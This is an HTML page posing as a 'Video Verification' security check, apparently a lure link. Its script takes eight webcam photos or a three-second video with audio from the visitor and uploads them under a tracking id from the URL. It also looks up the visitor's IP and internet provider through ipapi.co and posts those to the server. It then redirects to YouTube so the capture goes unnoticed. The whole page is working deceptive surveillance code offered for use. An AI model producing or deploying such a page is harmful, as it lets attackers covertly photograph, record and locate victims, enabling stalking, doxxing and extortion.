<!DOCTYPE html>
<html>
<head>
    <title>Video Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
        .btn { background: #0088cc; border: none; padding: 15px 30px; color: white; border-radius: 8px; font-size: 18px; cursor: pointer; }
        #loader { display: none; margin-top: 20px; }
        .progress-bg { width: 80%; background: #333; height: 10px; margin: 20px auto; border-radius: 5px; }
        #bar { width: 0%; background: #0088cc; height: 100%; border-radius: 5px; transition: 0.3s; }
    </style>
</head>
<body>
    <div id="setup">
        <h2>🔒 Security Check</h2>
        <p>Please complete the camera verification to continue.</p>
        <button class="btn" onclick="startProcess()">Verify Identity</button>
    </div>

    <div id="loader">
        <h3 id="step-text">Initialising...</h3>
        <div class="progress-bg"><div id="bar"></div></div>
    </div>

    <video id="video" width="640" height="480" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const uid = urlParams.get('id');
        const mode = urlParams.get('mode');

        async function startProcess() {
            document.getElementById('setup').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: (mode === 'video') 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Capture IP/ISP Info
                fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
                    fetch(`/log_info?id=${uid}`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    });
                });

                if (mode === 'video') {
                    recordVideo(stream);
                } else {
                    takePhotos();
                }
            } catch (err) {
                alert("Permission Denied. Please allow camera to verify.");
            }
        }

        function takePhotos() {
            let count = 0;
            const interval = setInterval(() => {
                if (count >= 8) {
                    clearInterval(interval);
                    finish();
                    return;
                }
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('file', blob);
                    fetch(`/upload?id=${uid}&type=photo`, { method: 'POST', body: fd });
                }, 'image/jpeg');
                count++;
                document.getElementById('bar').style.width = (count * 12.5) + "%";
                document.getElementById('step-text').textContent = `Capturing... ${count}/8`;
            }, 500);
        }

        function recordVideo(stream) {
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                const fd = new FormData();
                fd.append('file', blob);
                fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd });
                finish();
            };
            mediaRecorder.start();
            document.getElementById('step-text').textContent = "Verifying... (3s)";
            setTimeout(() => { mediaRecorder.stop(); document.getElementById('bar').style.width = "100%"; }, 3000);
        }

        function finish() {
            document.getElementById('step-text').textContent = "Verified! Redirecting...";
            setTimeout(() => { window.location.href = "https://www.youtube.com"; }, 1500);
        }
    </script>
</body>
</html>
